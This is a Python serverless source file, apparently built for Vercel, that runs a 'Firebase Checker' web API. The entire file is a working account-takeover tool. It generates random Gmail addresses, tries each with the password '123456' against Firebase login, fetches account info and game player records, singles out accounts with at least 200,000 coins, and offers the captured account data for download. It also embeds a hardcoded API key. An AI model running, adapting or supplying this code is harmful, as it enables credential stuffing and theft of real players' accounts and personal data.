from http.server import BaseHTTPRequestHandler
import json
import requests
import random
import time
import threading
from datetime import datetime

# Global state - Vercel'de her request'te resetlenebilir
class AccountChecker:
    def __init__(self):
        self.names = [
            "Jennifer", "Jacob", "Raymond", "Jamila", "Joseph", "Edgar",
            "Angel", "Issac", "Jose", "Danny", "Reed", "Brandon",
            "Fran", "Lisa", "Sonny", "Jaxon", "Luna", "Vera", "Zane", "Axel"
        ]
        self.total_attempts = 0
        self.successful_logins = 0
        self.failed_logins = 0
        self.high_coin_accounts = 0
        self.high_coin_accounts_list = []
        self.successful_accounts_list = []
        self.running = False
        self.current_status = "Stopped"
        self.logs = []
        self.last_activity = time.time()
        self.API_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
        self.PLAYER_RECORDS_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2"
        
        # Vercel için optimizasyon
        self.max_runtime = 300  # 5 dakika maksimum çalışma
        self.start_time = 0
        self.check_count = 0
        self.max_checks = 50  # Maksimum check sayısı

    def generate_email(self):
        name = random.choice(self.names)
        number = random.randint(0, 999)
        return f"{name.lower()}{number:03d}@gmail.com"

    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        self.logs.append(log_entry)
        if len(self.logs) > 30:
            self.logs.pop(0)
        print(log_entry)
        self.last_activity = time.time()

    def firebase_login(self, email, password):
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={self.API_KEY}"
        payload = {"email": email, "password": password, "returnSecureToken": True}
        try:
            response = requests.post(url, json=payload, timeout=3)
            return response.json() if response.status_code == 200 else None
        except:
            return None

    def get_account_info(self, id_token):
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key={self.API_KEY}"
        try:
            response = requests.post(url, json={"idToken": id_token}, timeout=3)
            return response.json() if response.status_code == 200 else None
        except:
            return None

    def get_player_records(self, id_token):
        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {id_token}"}
        payload = {"data": "451B8BFC69A0708148327490DD35CC301A6BC86B"}
        try:
            response = requests.post(self.PLAYER_RECORDS_URL, json=payload, headers=headers, timeout=3)
            return response.json() if response.status_code == 200 else None
        except:
            return None

    def extract_coin(self, data):
        try:
            if data and "result" in data and "coin" in data["result"]:
                return int(data["result"]["coin"])
            return int(data.get("coin", 0))
        except:
            return 0

    def check_single_account(self):
        """Tek bir hesap kontrol et - Vercel için optimize"""
        if self.check_count >= self.max_checks:
            self.stop_checking()
            self.log("🔄 Maximum check limit reached (50 accounts)")
            return
            
        if time.time() - self.start_time > self.max_runtime:
            self.stop_checking()
            self.log("⏰ Maximum runtime reached (5 minutes)")
            return

        email = self.generate_email()
        self.total_attempts += 1
        self.check_count += 1

        if self.total_attempts % 5 == 0:
            self.log(f"🔍 Checking #{self.total_attempts}: {email}")

        login_data = self.firebase_login(email, "123456")
        if not login_data:
            self.failed_logins += 1
            return

        self.successful_logins += 1
        self.log(f"✅ Success: {email}")

        id_token = login_data.get("idToken")
        if id_token:
            account_info = self.get_account_info(id_token)
            player_data = self.get_player_records(id_token)

            account_data = {
                "email": email,
                "account_info": account_info,
                "player_data": player_data,
                "timestamp": time.time()
            }
            self.successful_accounts_list.append(account_data)

            coin = self.extract_coin(player_data)
            if coin >= 200000:
                self.high_coin_accounts += 1
                high_coin_data = account_data.copy()
                high_coin_data["coin"] = coin
                self.high_coin_accounts_list.append(high_coin_data)
                self.log(f"💰 HIGH COIN: {email} - {coin:,}")

    def start_checking(self):
        if self.running:
            return False, "Already running"
        
        self.running = True
        self.current_status = "Running"
        self.start_time = time.time()
        self.check_count = 0
        self.log("🚀 STARTED - Checking accounts...")
        self.log("ℹ️  Vercel optimized: 5min max, 50 accounts max")
        
        # Hızlı bir şekilde birkaç account check et
        self._run_quick_check()
        return True, "Checker started"

    def _run_quick_check(self):
        """Hızlı check - Vercel timeout'ları için"""
        import threading
        
        def quick_check():
            checks_done = 0
            while (self.running and 
                   checks_done < 10 and  # Max 10 quick check
                   time.time() - self.start_time < 280):  # 4:40 dakika
                
                self.check_single_account()
                checks_done += 1
                time.sleep(0.5)  # Rate limiting
                
                # Her 5 check'te bir durum kontrolü
                if checks_done % 5 == 0 and not self.running:
                    break
            
            # Eğer hala running ise, scheduled checks başlat
            if self.running:
                self.log("⚡ Quick check completed, continuing...")
        
        thread = threading.Thread(target=quick_check, daemon=True)
        thread.start()

    def stop_checking(self):
        if not self.running:
            return False, "Not running"
        
        self.running = False
        self.current_status = "Stopped"
        runtime = time.time() - self.start_time
        self.log(f"⏹️ STOPPED - Ran for {runtime:.1f}s, checked {self.check_count} accounts")
        return True, "Checker stopped"

    def get_stats(self):
        success_rate = round((self.successful_logins / self.total_attempts * 100), 2) if self.total_attempts > 0 else 0
        high_coin_rate = round((self.high_coin_accounts / self.successful_logins * 100), 2) if self.successful_logins > 0 else 0
        
        runtime = time.time() - self.start_time if self.running else 0
        remaining_time = max(0, self.max_runtime - runtime) if self.running else 0
        remaining_checks = max(0, self.max_checks - self.check_count) if self.running else 0

        return {
            "total_attempts": self.total_attempts,
            "successful_logins": self.successful_logins,
            "failed_logins": self.failed_logins,
            "high_coin_accounts": self.high_coin_accounts,
            "status": self.current_status,
            "success_rate": success_rate,
            "high_coin_rate": high_coin_rate,
            "runtime": round(runtime, 1),
            "remaining_time": round(remaining_time, 1),
            "remaining_checks": remaining_checks,
            "check_count": self.check_count
        }

    def save_accounts(self, account_type):
        try:
            timestamp = int(time.time())
            if account_type == "high_coin":
                data = self.high_coin_accounts_list
                filename = f"high_coin_accounts_{timestamp}.json"
            else:
                data = self.successful_accounts_list
                filename = f"successful_accounts_{timestamp}.json"
            
            if not data:
                return False, f"No {account_type} accounts to save"
            
            json_data = json.dumps(data, ensure_ascii=False, indent=2)
            self.log(f"💾 Prepared {len(data)} {account_type} accounts for download")
            return True, {"filename": filename, "data": json_data, "count": len(data)}
            
        except Exception as e:
            error_msg = f"Save error: {str(e)}"
            self.log(f"❌ {error_msg}")
            return False, error_msg

    def reset_stats(self):
        self.total_attempts = 0
        self.successful_logins = 0
        self.failed_logins = 0
        self.high_coin_accounts = 0
        self.high_coin_accounts_list = []
        self.successful_accounts_list = []
        self.logs = ["🔄 Statistics reset"]
        self.log("🔄 All statistics reset successfully")
        return True, "Statistics reset successfully"

# Global instance
checker = AccountChecker()

class Handler(BaseHTTPRequestHandler):
    def _set_cors_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        self.send_header('Content-Type', 'application/json; charset=utf-8')

    def do_OPTIONS(self):
        self.send_response(200)
        self._set_cors_headers()
        self.end_headers()

    def _send_json_response(self, status_code, data):
        self.send_response(status_code)
        self._set_cors_headers()
        self.end_headers()
        self.wfile.write(json.dumps(data, ensure_ascii=False).encode('utf-8'))

    def do_GET(self):
        try:
            if self.path == '/api/stats':
                stats = checker.get_stats()
                self._send_json_response(200, {"status": "success", "data": stats})
                
            elif self.path == '/api/logs':
                self._send_json_response(200, {
                    "status": "success", 
                    "data": {"logs": checker.logs, "count": len(checker.logs)}
                })
                
            elif self.path == '/api/health':
                self._send_json_response(200, {
                    "status": "success",
                    "data": {
                        "service": "Firebase Checker",
                        "status": "healthy",
                        "checker_status": checker.current_status,
                        "timestamp": time.time()
                    }
                })
                
            else:
                self._send_json_response(404, {"status": "error", "message": "Endpoint not found"})
                
        except Exception as e:
            self._send_json_response(500, {"status": "error", "message": f"Server error: {str(e)}"})

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length) if content_length > 0 else b'{}'
            
            try:
                request_data = json.loads(post_data.decode('utf-8')) if post_data else {}
            except:
                request_data = {}

            if self.path == '/api/start':
                success, message = checker.start_checking()
                if success:
                    self._send_json_response(200, {"status": "success", "message": message})
                else:
                    self._send_json_response(400, {"status": "error", "message": message})
                    
            elif self.path == '/api/stop':
                success, message = checker.stop_checking()
                if success:
                    self._send_json_response(200, {"status": "success", "message": message})
                else:
                    self._send_json_response(400, {"status": "error", "message": message})
                    
            elif self.path == '/api/save/highcoin':
                success, result = checker.save_accounts("high_coin")
                if success:
                    self._send_json_response(200, {
                        "status": "success",
                        "message": "High coin accounts ready",
                        "data": result
                    })
                else:
                    self._send_json_response(400, {"status": "error", "message": result})
                    
            elif self.path == '/api/save/successful':
                success, result = checker.save_accounts("successful")
                if success:
                    self._send_json_response(200, {
                        "status": "success", 
                        "message": "Successful accounts ready",
                        "data": result
                    })
                else:
                    self._send_json_response(400, {"status": "error", "message": result})
                    
            elif self.path == '/api/reset':
                success, message = checker.reset_stats()
                if success:
                    self._send_json_response(200, {"status": "success", "message": message})
                else:
                    self._send_json_response(400, {"status": "error", "message": message})
                    
            elif self.path == '/api/check-now':
                # Anında bir account check et
                checker.check_single_account()
                self._send_json_response(200, {
                    "status": "success",
                    "message": "Immediate check completed",
                    "data": checker.get_stats()
                })
                    
            else:
                self._send_json_response(404, {"status": "error", "message": "Endpoint not found"})
                
        except Exception as e:
            self._send_json_response(500, {"status": "error", "message": f"Server error: {str(e)}"})

# Vercel serverless function
def main_handler(event, context):
    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        },
        'body': json.dumps({
            'status': 'success',
            'message': 'Firebase Checker API - Vercel Optimized',
            'timestamp': time.time()
        })
    }

if __name__ == '__main__':
    from http.server import HTTPServer
    port = 3000
    server = HTTPServer(('localhost', port), Handler)
    print(f"🚀 Server running on http://localhost:{port}")
    server.serve_forever()
